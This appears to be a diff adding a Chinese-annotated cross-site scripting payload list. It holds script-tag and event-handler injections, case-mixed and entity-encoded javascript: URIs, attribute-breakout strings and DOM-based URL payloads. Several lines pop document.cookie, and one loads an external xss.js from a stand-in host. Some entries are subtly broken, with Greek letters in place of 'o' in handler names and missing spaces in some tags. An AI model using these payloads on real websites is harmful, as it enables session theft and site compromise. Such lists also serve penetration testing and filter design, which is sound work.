@@ -1,0 +1,52 @@
+<script>alert("hack")</script>   #弹出hack
+<script>alert(/hack/)</script>   #弹出hack
+<sCRipt>alert(\'hack\')</scRiPt> 
+<script>alert(1)</script>        #弹出1，对于数字可以不用引号
+"><script>alert(document.cookie)</script>      #弹出cookie
+<script src=http://xxx.com/xss.js></script>  #引用外部的xss
+<svg onload="alert(1)">
+<svg onload="alert(1)"//
+<img  src=1  οnerrοr=alert("hack")>
+<img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
+<body οnlοad=alert(1)>
+<body οnpageshοw=alert(1)>
+<video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
+<style οnlοad=alert(1)></style>
+
+
+
+javaSCRIPT&colon;alert(1)
+JaVaScRipT:alert(1)
+javas&Tab;cript:\u0061lert(1);
+javascript:\u0061lert&#x28;1&#x29
+avascript&#x3A;alert&lpar;document&period;cookie&rpar;
+
+
+
+
+
+
+
+'onclick='alert(/xss/)
+'onmouseover='alert(/xss/)
+
+111”><svg/onload=alert(1)>
+1111”><svg/onload=alert(1)>
+1111”onmouseout=”alert(1)
+
+拿出较为好用的payload
+<details/open/ontoggle=alert(1)>
+<svg/onload=alert(1)>
+<img/src/onerror=alert(1)>
+<video/src/onerror=alert(1)>
+<script>(alert)(1)</script>
+<video><sourceonerror=”javascript:alert(1)”>
+<video/src/onloadstart=”alert(1)”>
+<ahref=javascript:alert(1)>222</a>
+
+
+dom型xss
+http://#javascript:alert(1)。
+#vbscript:msgbox(IE)
+http:/SAD/ASDXCZ/？url=javascript:alert(1)//http://cos.top15.cn
+http://#';alert('xss');//
